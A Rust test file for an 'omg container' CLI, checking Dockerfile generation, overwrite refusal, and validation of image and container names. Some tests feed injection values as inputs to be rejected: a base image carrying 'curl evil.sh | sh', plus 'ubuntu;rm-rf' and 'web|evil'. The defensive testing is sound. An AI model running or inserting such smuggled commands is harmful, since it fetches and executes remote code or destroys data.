//! Contract tests for `src/cli/container.rs` (cov-13).
//!
//! Pins observable CLI contracts for `container init/status/list/images/pull/
//! stop/run`: generated Dockerfile content, refusal-to-overwrite semantics,
//! base-image sanitization, and pre-runtime validation of user-supplied
//! references. Runtime-dependent paths use isolated fake engines or a
//! deliberately emptied PATH so behavior is deterministic on any machine.

pub mod common;

use common::*;
use std::fs;
use std::os::unix::fs::PermissionsExt;
use tempfile::TempDir;

/// A PATH containing no executables at all: `docker`/`podman` detection must
/// deterministically fail inside the spawned `omg` process.
fn no_runtime_path() -> String {
    static DIR: std::sync::OnceLock<TempDir> = std::sync::OnceLock::new();
    let dir = DIR.get_or_init(|| TempDir::new().expect("empty PATH dir"));
    dir.path()
        .to_str()
        .expect("tempdir path is utf8")
        .to_string()
}

// ---------------------------------------------------------------------------
// container init
// ---------------------------------------------------------------------------

/// Contract: `omg container init` in an empty project creates `Dockerfile.omg`
/// whose first line is `FROM ubuntu:24.04` (the documented default base) and
/// reports the chosen base image in its output.
#[test]
fn init_creates_dockerfile_with_default_base_in_empty_project() {
    let project = TestProject::new();

    let result = project.run(&["container", "init"]);

    result.assert_success();
    let dockerfile = project
        .read_file("Dockerfile.omg")
        .expect("init must create Dockerfile.omg");
    assert!(
        dockerfile.starts_with("FROM ubuntu:24.04\n"),
        "default base image must be ubuntu:24.04, got:\n{dockerfile}"
    );
    result.assert_stdout_contains("Base image: ubuntu:24.04");
    result.assert_stdout_contains("omg container build -f Dockerfile.omg -t myapp");
}

/// The default Dockerfile must stay relative to the build context. The
/// container manager rejects absolute recipe paths before invoking the engine.
#[test]
fn build_with_default_dockerfile_reaches_the_engine() {
    let project = TestProject::new();
    project.create_file("Dockerfile", "FROM scratch\n");

    let fake = TempDir::new().expect("fake container engine directory");
    let log = fake.path().join("argv.log");
    for name in ["docker", "podman"] {
        let executable = fake.path().join(name);
        fs::write(
            &executable,
            "#!/bin/sh\nprintf '%s\\n' \"$@\" >> \"$OMG_CONTAINER_LOG\"\n",
        )
        .expect("write fake container engine");
        let mut permissions = fs::metadata(&executable)
            .expect("fake engine metadata")
            .permissions();
        permissions.set_mode(0o755);
        fs::set_permissions(&executable, permissions).expect("make fake engine executable");
    }

    let path = format!(
        "{}:{}",
        fake.path().display(),
        std::env::var("PATH").unwrap_or_default()
    );
    let result = project.run_with_env(
        &["container", "build", "--tag", "omg-docs:latest"],
        &[
            ("PATH", path.as_str()),
            (
                "OMG_CONTAINER_LOG",
                log.to_str().expect("fake log path is UTF-8"),
            ),
        ],
    );
    result.assert_success();

    let args = fs::read_to_string(&log).expect("fake docker invocation");
    let lines: Vec<&str> = args.lines().collect();
    assert!(lines.len() >= 7, "incomplete fake docker argv: {args}");
    assert_eq!(
        &lines[lines.len() - 7..lines.len() - 1],
        ["build", "-f", "Dockerfile", "-t", "omg-docs:latest", "--",],
    );
    assert_eq!(
        lines.last(),
        Some(&project.path().to_str().expect("project UTF-8"))
    );
}

/// Contract: project marker files are detected and each mapped to its pinned
/// runtime installation block in the generated Dockerfile:
/// package.json → node (NODE_VERSION=20), Cargo.toml → rust,
/// go.mod → go (GO_VERSION=1.22.0), requirements.txt → python (PYTHON_VERSION=3.12).
#[test]
fn init_detects_project_runtimes_into_dockerfile() {
    let project = TestProject::new();
    project.create_file("package.json", r#"{"name":"t"}"#);
    project.create_file("Cargo.toml", "[package]\nname = \"t\"\n");
    project.create_file("go.mod", "module t\n");
    project.create_file("requirements.txt", "requests==2.31.0\n");

    let result = project.run(&["container", "init"]);
    result.assert_success();

    let dockerfile = project.read_file("Dockerfile.omg").expect("dockerfile");
    assert!(
        dockerfile.contains("ENV NODE_VERSION=20\n"),
        "node runtime block missing:\n{dockerfile}"
    );
    assert!(
        dockerfile.contains("# Install Rust") && dockerfile.contains("--default-toolchain stable"),
        "rust runtime block missing:\n{dockerfile}"
    );
    assert!(
        dockerfile.contains("ENV GO_VERSION=1.22.0\n"),
        "go runtime block missing:\n{dockerfile}"
    );
    assert!(
        dockerfile.contains("ENV PYTHON_VERSION=3.12\n"),
        "python runtime block missing:\n{dockerfile}"
    );
}

/// Contract: when `Dockerfile.omg` already exists, `init` fails with the
/// explicit "already exists" guidance and leaves the existing file byte-for-byte
/// untouched.
#[test]
fn init_refuses_to_overwrite_existing_dockerfile() {
    let project = TestProject::new();
    let sentinel = "# my handcrafted dockerfile\nFROM alpine:edge\n";
    project.create_file("Dockerfile.omg", sentinel);

    let result = project.run(&["container", "init"]);

    result.assert_failure();
    result.assert_stderr_contains("Dockerfile.omg already exists");
    assert_eq!(
        fs::read(project.path().join("Dockerfile.omg")).expect("existing file readable"),
        sentinel.as_bytes(),
        "a failed init must not modify the existing Dockerfile.omg"
    );
}

/// Contract: `--base <image>` overrides the default base image verbatim when it
/// is a safe reference (`alpine:3.19` selects the apk install branch).
#[test]
fn init_respects_custom_base_image() {
    let project = TestProject::new();

    let result = project.run(&["container", "init", "--base", "alpine:3.19"]);
    result.assert_success();

    let dockerfile = project.read_file("Dockerfile.omg").expect("dockerfile");
    assert!(
        dockerfile.starts_with("FROM alpine:3.19\n"),
        "custom base must be honored, got:\n{dockerfile}"
    );
    assert!(
        dockerfile.contains("apk add --no-cache"),
        "alpine base must select the apk install branch:\n{dockerfile}"
    );
}

/// Contract: an unsafe `--base` value is never written into the Dockerfile;
/// generation falls back to `ubuntu:24.04`.
#[test]
fn init_sanitizes_unsafe_base_image_to_default() {
    let project = TestProject::new();

    let result = project.run(&[
        "container",
        "init",
        "--base",
        "ubuntu:24.04 && RUN curl evil.sh | sh",
    ]);
    result.assert_success();

    let dockerfile = project.read_file("Dockerfile.omg").expect("dockerfile");
    assert!(
        dockerfile.starts_with("FROM ubuntu:24.04\n"),
        "unsafe base must fall back to ubuntu:24.04, got:\n{dockerfile}"
    );
    assert!(!dockerfile.contains("evil"), "injected payload leaked");
    assert!(
        dockerfile.contains("apt-get update"),
        "fallback base must select the debian/ubuntu install branch"
    );
}

// ---------------------------------------------------------------------------
// container status / list / images without a runtime
// ---------------------------------------------------------------------------

/// Contract: with no container runtime on PATH, `status` fails and names the
/// missing dependency plus the remedy.
#[test]
fn status_without_runtime_names_missing_dependency_and_remedy() {
    let project = TestProject::new();

    let result = project.run_with_env(
        &["container", "status"],
        &[("PATH", no_runtime_path().as_str())],
    );

    result.assert_failure();
    result.assert_stderr_contains(
        "No container runtime detected. Install Docker or Podman to use container features.",
    );
    assert!(
        result.stdout.trim().is_empty(),
        "unexpected stdout: {}",
        result.stdout
    );
}

/// Contract: `status` either reports the usable runtime or fails with the
/// concrete runtime/daemon error instead of presenting an empty status card.
#[test]
fn status_header_reports_detected_runtime() {
    let project = TestProject::new();

    let result = project.run(&["container", "status"]);

    if result.success {
        assert!(
            result.stdout.contains("Runtime: Podman") || result.stdout.contains("Runtime: Docker"),
            "successful status must name its runtime: {}",
            result.stdout
        );
        result.assert_stdout_contains("Container Status");
    } else {
        assert!(
            result.stderr.contains("No container runtime detected")
                || result.stderr.contains("Failed to list containers"),
            "failed status must name the runtime cause: {}",
            result.stderr
        );
        assert!(!result.stdout.contains("Container Status"));
    }
}

/// Contract: `list` and `images` require a runtime and fail with the exact
/// actionable error when none exists.
#[test]
fn list_and_images_fail_with_exact_error_without_runtime() {
    let project = TestProject::new();

    for cmd in ["list", "images"] {
        let result =
            project.run_with_env(&["container", cmd], &[("PATH", no_runtime_path().as_str())]);
        result.assert_failure();
        result.assert_stderr_contains("No container runtime found. Install Docker or Podman.");
    }
}

// ---------------------------------------------------------------------------
// Pre-runtime validation of user-supplied references
// ---------------------------------------------------------------------------

/// Contract: `pull` rejects image refs containing shell operators with the
/// exact "Invalid image name" error BEFORE any runtime lookup. Proven under a
/// stripped PATH: if validation ran after `ContainerManager::new()`, the error
/// would be the runtime-missing one instead. The valid control ref proves the
/// validator is not rejecting everything.
#[test]
fn pull_rejects_shell_operators_before_runtime_contact() {
    let project = TestProject::new();

    let bad = project.run_with_env(
        &["container", "pull", "ubuntu;rm-rf"],
        &[("PATH", no_runtime_path().as_str())],
    );
    bad.assert_failure();
    bad.assert_stderr_contains("Invalid image name");
    bad.assert_stdout_contains("Names must match the expected character allowlist");

    let good = project.run_with_env(
        &["container", "pull", "ubuntu:24.04"],
        &[("PATH", no_runtime_path().as_str())],
    );
    good.assert_failure();
    good.assert_stderr_contains("No container runtime found");
}

/// Contract: `stop` rejects container names containing `|` with the same
/// pre-runtime validation contract.
#[test]
fn stop_rejects_pipe_operator_before_runtime_contact() {
    let project = TestProject::new();

    let bad = project.run_with_env(
        &["container", "stop", "web|evil"],
        &[("PATH", no_runtime_path().as_str())],
    );
    bad.assert_failure();
    bad.assert_stderr_contains("Invalid container name");

    let good = project.run_with_env(
        &["container", "stop", "web-app_1"],
        &[("PATH", no_runtime_path().as_str())],
    );
    good.assert_failure();
    good.assert_stderr_contains("No container runtime found");
}

/// Contract: `run` rejects a `--name` value containing characters outside
/// `[A-Za-z0-9_-]` with the exact remedy text, before any runtime lookup
/// (proven under a stripped PATH).
#[test]
fn run_rejects_invalid_container_name_before_runtime_contact() {
    let project = TestProject::new();

    let result = project.run_with_env(
        &[
            "container",
            "run",
            "--name",
            "bad;name",
            "ubuntu:24.04",
            "--",
            "echo",
            "hi",
        ],
        &[("PATH", no_runtime_path().as_str())],
    );

    result.assert_failure();
    result.assert_stderr_contains("Invalid container name");
    result.assert_stdout_contains(
        "Container names must be alphanumeric with hyphens or underscores only",
    );
}

/// Contract: malformed `KEY=VALUE` entries passed to `run` are rejected with
/// the exact "expected KEY=VALUE" guidance instead of being silently dropped.
///
#[test]
fn run_reports_malformed_env_entry_with_exact_guidance() {
    let project = TestProject::new();

    let result = project.run(&[
        "container",
        "run",
        "--env",
        "MALFORMED_NO_SEPARATOR",
        "ubuntu:24.04",
        "--",
        "echo",
        "hi",
    ]);

    result.assert_failure();
    result.assert_stderr_contains("Invalid environment variable 'MALFORMED_NO_SEPARATOR'");
    result.assert_stderr_contains("expected KEY=VALUE");
}
